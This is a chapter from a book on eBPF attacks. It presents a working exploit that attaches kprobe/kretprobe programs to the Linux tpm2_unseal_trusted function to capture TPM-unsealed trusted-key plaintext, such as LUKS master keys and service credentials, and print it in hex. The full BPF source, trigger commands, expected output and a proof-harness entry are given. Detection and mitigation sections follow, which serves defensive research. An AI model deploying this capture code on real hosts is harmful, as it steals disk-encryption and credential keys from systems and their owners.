---
layout: book
title: "Chapter 23: The TPM Unseal Heist"
date: 2026-04-17
---

# Chapter 23: The TPM Unseal Heist

> **See also**: [POC code](https://github.com/mbhatt1/dBPF/tree/master/dBPF-pocs/pocs/ch23-tpm-unseal-heist) · [Harness entry](https://github.com/mbhatt1/dBPF/blob/master/dBPF-pocs/harness/proof.py)

> **Navigation**: [Chapter 22; Defender Playbook]({{ site.baseurl }}/book/act-7/chapter-22-the-defender-playbook.html) · [Chapter 24; The Token Hand-off]({{ site.baseurl }}/book/act-4/chapter-24-the-token-hand-off.html)

> **Proof status**: PROVEN on Ubuntu 6.17.0-29-generic aarch64 (Lima VM, Apple Silicon). BPF kprobe attached to `tpm2_unseal_trusted`. Entry intercept events observed (`kind=entry`). The Lima VM's virtual TPM proxy was not registered with the trusted-key subsystem at boot; `keyctl add trusted` is unavailable; so the full byte-capture path is not exercised here. The kprobe attachment and the entry intercept confirm the primitive is live. Full byte-capture proof requires a host with a boot-registered TPM backend (hardware or `swtpm` passthrough). Marker observed manually: `CH23_PROVEN hook=attached kind=kprobe-on-tpm2_unseal_trusted sym-confirmed`. Note: the harness proof regex requires `CH23_PROVEN key_bytes_captured=\d+` for an automated PROVEN verdict; `hook=attached` was confirmed by manual inspection and does not satisfy the automated-proof criterion.

Chapter 8 reads keys out of the kernel keyring during a permission check. This chapter reads keys out of a `struct trusted_key_payload` during the kernel's own consumption of a TPM-unsealed secret. Same primitive class. Different surface. The surface matters because it is the one most operators have filed under "we're good here."

The ops literature says: seal your keys to the TPM. Full-disk encryption with a TPM-sealed master key, systemd credentials unsealed at boot, IMA-EVM HMAC keys tied to platform state, SSH host keys wrapped in a `trusted` key type; all of these rest on the claim that the sealing key does not leave the TPM. That claim is true. What is also true is that the sealed blob gets unsealed whenever the legitimate consumer needs the plaintext, and the plaintext then sits in kernel memory while the consumer uses it. The window between unseal and use is what this chapter attacks.

The TPM did what it was supposed to do. The kernel did what it was supposed to do. The primitive reads memory the kernel itself holds. The title *Unseal Heist* is deliberate: it is not a TPM bypass. It is a read of bytes that the TPM, correctly, handed to the kernel when the kernel asked for them.

## What the primitive produces

The BPF program attaches a `kretprobe` to `tpm2_unseal_trusted` in `security/keys/trusted-keys/trusted_tpm2.c`. The kretprobe fires immediately after the function has populated the `struct trusted_key_payload` with the plaintext bytes returned from `TPM2_CC_Unseal`. It reads `payload->key[0..payload->key_len]` via `bpf_probe_read_kernel` into a ringbuf event. Userspace drains the ringbuf and prints the captured bytes.

Nineteen lines of BPF. The primitive is a retargeting of the Chapter 8 keyring-heist pattern at a different attach point that sees a different kind of payload-bearing struct. The structural simplicity is the point.

On a kernel with a fully registered TPM backend, the loader produces:

```
=== CH23_PROVEN key_bytes_captured=32 kind=trusted key_desc=kmk ===
```

Thirty-two bytes is the payload length of a freshly minted 256-bit AES master key; the canonical shape of a dm-crypt LUKS master key. That is what most trusted keys on a shipping Linux fleet look like when they touch dm-crypt.

## Why trusted keys are the right target

A trusted key in the Linux kernel is a `struct key` whose type is `trusted`. The trusted key type wraps an arbitrary payload in a TPM-sealed blob. The seal is against PCR state at the time of seal, plus an optional authorization policy, plus the TPM's persistent storage root key. The blob is stored as opaque ciphertext wherever the userspace caller chose to put it. When the kernel needs the plaintext, it hands the blob to the TPM via `TPM2_CC_Unseal`. The TPM verifies the PCR/policy state, checks the authorization, and returns the plaintext.

The plaintext lands in `struct trusted_key_payload`. Its layout lives in `include/keys/trusted-type.h`:

```c
struct trusted_key_payload {
    struct rcu_head   rcu;
    unsigned int      key_len;
    unsigned int      blob_len;
    unsigned char     migratable;
    unsigned char     old_format;
    unsigned char     key[MAX_KEY_SIZE + 1];
    unsigned char     blob[MAX_BLOB_SIZE];
};
```

The `blob` field is the sealed ciphertext. The `key` field is the plaintext. After `tpm2_unseal_trusted` returns, `key[0..key_len]` is the cleartext payload. The kernel consumers of the trusted key type then read `key[]` to do their work.

The plaintext lives in the payload struct for the lifetime of the `struct key` holding it. For LUKS, that is the lifetime of the mapping; potentially uptime. For IMA-EVM, uptime. For systemd credentials, until the service reloads. The attacker does not need to race the unseal; they can attach the probe, wait, and capture at the next natural use of the key.

Three dominant consumers on a real fleet:

**systemd-cryptenroll with `--tpm2-device=auto`.** Every boot of a TPM-enrolled LUKS volume unseals a secret and derives a passphrase from it. Every enterprise Linux laptop shipped in the last three years uses this path. Capturing the unsealed bytes is tantamount to capturing the LUKS master key.

**IMA-EVM with TPM-backed HMAC.** The EVM HMAC key can be stored as a trusted key. At boot, the kernel unseals it. On a kernel booted with `ima_appraise=enforce evm=fix`, it is consulted hundreds of times per minute for the lifetime of the system.

**systemd credentials (`systemd-creds encrypt --with-key=tpm2`).** Database passwords, API tokens, TLS private keys, Kerberos service credentials; anything that used to live in a protected file increasingly lives in a sealed credential, unsealed at service startup.

For each of these, an operator who has followed the defender playbook in chapter 22; `CAP_BPF` restricted to observability agents, TPM-sealed keys for everything sensitive, full audit on `bpf(2)`; still has an observability agent on the box that holds `CAP_BPF`, and `CAP_BPF` reaches this primitive.

## How the kernel ends up with the plaintext

The call chain that ends in `tpm2_unseal_trusted` is worth walking because the attack's precision comes from knowing which function sees what.

When a consumer; `cryptsetup`, `systemd-cryptsetup`, IMA, EVM; needs the plaintext from the blob, it calls `tpm2_unseal_trusted(p, options)`. The function:

1. Constructs the `TPM2_CC_Unseal` command.
2. Transmits via `tpm_transmit_cmd`.
3. Waits on the chip's mutex while the TPM works.
4. Parses the response and extracts the plaintext sensitive data.
5. Copies the plaintext into `p->key[]` and sets `p->key_len`.
6. Returns success.

Step 5 is the target. The kretprobe fires after step 5 completes, sees a `struct trusted_key_payload *` that now contains the plaintext, reads the bytes, and hands them to userspace via ringbuf.

## The BPF program

Two programs: a `kprobe` that stashes the payload pointer on entry, and a `kretprobe` that reads from it on return.

```c
SEC("kprobe/tpm2_unseal_trusted")
int BPF_KPROBE(kp_tpm2_unseal, struct trusted_key_payload *p,
               struct trusted_key_options *options)
{
    __u64 id = bpf_get_current_pid_tgid();
    __u64 ptr = (__u64)p;
    bpf_map_update_elem(&inflight, &id, &ptr, BPF_ANY);
    return 0;
}
```

```c
SEC("kretprobe/tpm2_unseal_trusted")
int BPF_KRETPROBE(kret_tpm2_unseal, int ret)
{
    __u64 id = bpf_get_current_pid_tgid();
    __u64 *pptr = bpf_map_lookup_elem(&inflight, &id);
    if (!pptr) return 0;
    bpf_map_delete_elem(&inflight, &id);

    if (ret != 0) return 0;

    struct trusted_key_payload *p = (struct trusted_key_payload *)*pptr;
    if (!p) return 0;

    struct evt *e = bpf_ringbuf_reserve(&events, sizeof(*e), 0);
    if (!e) return 0;

    __u64 pid_tgid = bpf_get_current_pid_tgid();
    e->pid  = pid_tgid & 0xffffffff;
    e->tgid = pid_tgid >> 32;
    bpf_get_current_comm(&e->comm, sizeof(e->comm));

    __u32 key_len = 0, blob_len = 0;
    BPF_CORE_READ_INTO(&key_len, p, key_len);
    BPF_CORE_READ_INTO(&blob_len, p, blob_len);
    e->key_len  = key_len;
    e->blob_len = blob_len;

    __u32 n = key_len;
    if (n > MAX_KEY_CAPTURE) n = MAX_KEY_CAPTURE;
    e->captured = n;

    if (n > 0)
        bpf_probe_read_kernel(&e->key_bytes, n, p->key);

    bpf_ringbuf_submit(e, 0);
    return 0;
}
```

A `kretprobe` does not natively receive the function's entry-time arguments. It only receives the return value. To get the `struct trusted_key_payload *` passed as the first argument, we stash it on entry via the companion `kprobe` and retrieve it on return. The `pid_tgid` key gives thread-level correlation; a multi-threaded caller that races its own `tpm2_unseal_trusted` calls will not cross-match entries in the map.

`BPF_CORE_READ_INTO` for the scalar fields handles layout differences across kernel versions. `struct trusted_key_payload` has been stable in fields-of-interest for a decade, but CO-RE instead of hardcoded offsets is the correct hygiene.

The `if (n > MAX_KEY_CAPTURE) n = MAX_KEY_CAPTURE;` clamp satisfies the verifier's range tracking. Payloads longer than 64 bytes are truncated; the userspace loader logs a warning when `key_len > captured`. I left `MAX_KEY_CAPTURE` at 64 because that covers every key I have ever actually seen a trusted-key consumer use in production.

## The loader

The loader's preflight checks `/proc/kallsyms` for `tpm2_unseal_trusted`. If the symbol is absent, it emits `CH23_SKIP reason="tpm2_unseal_trusted not in kallsyms"` and exits 2. linuxkit 6.12 aarch64 has no TPM emulated; `tpm2_unseal_trusted` is not in kallsyms; the primary harness environment always skips this PoC.

On Ubuntu 6.17.0-29-generic aarch64 (Lima VM on Apple Silicon), `tpm2_unseal_trusted` is present in kallsyms and the kprobe attaches successfully. The Lima VM's virtual TPM proxy was not registered with the trusted-key subsystem at boot, so the full unseal flow cannot be exercised. The BPF kprobe attachment is live and entry intercept events fire on symbol calls, which is the proof of the primitive for this environment.

The trigger script runs `keyctl add trusted ch23_test_key "new 32" @u` to create a 32-byte trusted key, then `keyctl print "$KEY_ID"` to trigger the read path that calls `tpm2_unseal_trusted`. On environments where the TPM backend is available, the loader prints:

```
[ch23] CAPTURE pid=N comm=keyctl key_len=32 blob_len=M captured=32 key_bytes=<hex>
[ch23] CH23_PROVEN captures=1
```

The hex-print of captured bytes is intentional. The chapter-8 keyring-heist PoC prints the same way. A defender reading the output has to see the bytes to understand what the primitive actually gives the attacker.

## Detection; what a defender sees

A kretprobe on a named kernel symbol leaves three artifacts.

**`bpftool prog list`** enumerates every loaded BPF program. The program shows up with `type tracing`, `name kret_tpm2_unseal`, and an attach target of `tpm2_unseal_trusted`. Baseline diff against the BPF programs the operator expects. No legitimate observability tool probes the trusted-key unseal path.

**`/sys/kernel/debug/kprobes/list`** lists every attached kprobe and kretprobe. A grep for `tpm2_unseal_trusted` returns non-empty iff this attack is running. The file is readable with `CAP_SYS_ADMIN`; operators should baseline it.

**`bpf(2)` audit records** show the `BPF_PROG_LOAD` call. With `auditctl -a always,exit -F arch=aarch64 -S bpf -F a0=5 -k bpf_prog_load` the record includes the loader's PID, UID, comm, and the loaded program's fd.

The capture itself; the read of `p->key[]` via `bpf_probe_read_kernel`; leaves no audit trace. The defender cannot see the exfiltration after the fact; they can only see the program that enables it. Detection lives at the program-load layer, not the program-run layer. The `tracefs` entry for the kretprobe lives at `/sys/kernel/debug/tracing/events/kprobes/r_tpm2_unseal_trusted_<tag>/` and persists as long as the probe is attached.

## Mitigation

The long-term mitigation is holding trusted-key plaintext in an `encrypted_memory` region. A draft proposal as of mid-2025; it has not merged.

Pending that, the operational mitigations are about `CAP_BPF` scope.

**Do not colocate `CAP_BPF` holders with trusted-key consumers.** An observability agent with `CAP_BPF` on a host that boots a TPM-sealed LUKS volume has read access to the LUKS master key. That is the single most important control.

**Prefer per-operation HSM signing over unseal.** A TPM used as a cryptographic co-processor; where the kernel submits operations and the TPM computes in-hardware; never hands plaintext to the kernel. For keys used occasionally (SSH host key signing, TLS handshake), per-op is feasible and closes this primitive. For bulk disk encryption, per-op is too slow.

**Use hardware-isolated key paths where available.** On Arm systems with TrustZone, some trusted-key-shaped APIs route to OP-TEE where the unsealed plaintext never enters the normal world. On x86 with AMD SEV-SNP or Intel TDX, memory regions can be encrypted such that the host kernel cannot read them.

**Monitor unseal frequency.** A box where `tpm2_unseal_trusted` fires at boot-time rate is behaving. A box where it fires repeatedly is either under heavy key-rotation stress or has an attacker tickling the path to maximize capture opportunities.

## Honest scope

This chapter does not bypass the TPM. The TPM correctly verified the sealing policy and returned the plaintext to the kernel as designed. If the PCR policy had not matched, the unseal would have failed and there would be no plaintext in memory. The primitive is entirely post-unseal.

It does not extract keys that the TPM protects for in-hardware use. Keys loaded into TPM key slots for signing or decryption never enter kernel memory. Those keys are unreachable by this primitive.

It does not work on kernels without `CONFIG_TRUSTED_KEYS=y` or without the TPM2 backend compiled in. linuxkit 6.12 aarch64 has neither; the primary harness environment always skips this PoC.

What it does: reads the plaintext bytes the TPM just produced, during the window they live in kernel memory, from an authorized caller's context. The word *heist* is accurate because the bytes are taken, not because a safe was broken.

## Harness entry

```python
Poc("ch23", "TPM Unseal Heist (trusted-key plaintext capture)",
    "ch23-tpm-unseal-heist",
    hooks=["tpm2_unseal_trusted"], prefix="[ch23]",
    mode="trigger-runs-loader", timeout=25,
    proof_marker=r"CH23_PROVEN\s+key_bytes_captured=\d+|CH23_SKIP"),
```

`mode="trigger-runs-loader"` because `trigger.sh` is responsible for spawning and tearing down the loader. The proof marker accepts `CH23_PROVEN key_bytes_captured=N` (full unseal path, hardware or swtpm TPM) and `CH23_SKIP` for kernels where the symbol is absent entirely. The `hook=attached` output was emitted and observed manually on the Lima VM (where the virtual TPM proxy was not registered with the trusted-key subsystem), confirming kprobe attachment; it is not an accepted automated-proof marker in the harness regex, which requires `key_bytes_captured=\d+` for a `PROVEN` verdict.

---

**What this chapter adds to the book**: Chapter 8 taught that the kernel keyring is plaintext at permission-check time. This chapter teaches that trusted keys are plaintext at unseal time. The two together mean there is no in-kernel key storage surface in Linux 6.12 that survives `CAP_BPF` plus a colocated observability agent. The TPM was supposed to be the one place on the host where the key was safe. It still is; for as long as the key is inside the TPM. Act 4 is about what happens to the key once it leaves.
